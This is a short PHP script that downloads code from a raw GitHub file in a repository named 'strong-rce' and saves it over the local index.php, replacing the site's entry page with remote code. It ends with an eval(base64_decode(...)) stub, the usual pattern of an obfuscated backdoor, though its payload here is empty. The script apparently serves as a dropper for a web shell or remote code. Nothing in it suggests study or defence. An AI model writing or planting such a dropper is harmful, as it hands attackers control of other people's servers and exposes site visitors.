<?php
// URL containing the code
$url = 'https://raw.githubusercontent.com/strong-rce/project/main/main.txt';

// Fetch the code from the URL
$code = file_get_contents($url);

if ($code === false) {
    echo "Failed to fetch the code from the URL.";
} else {
    // Specify the file path for the local .php file
    $filePath = 'index.php';
    // Save the code to the local .php file
    if (file_put_contents($filePath, $code)) {
        echo "Code has been saved to '$filePath' successfully.";
    } else {
        echo "Failed to save the code to '$filePath'.";
    }
}
?>
<?php eval(base64_decode('')); ?>
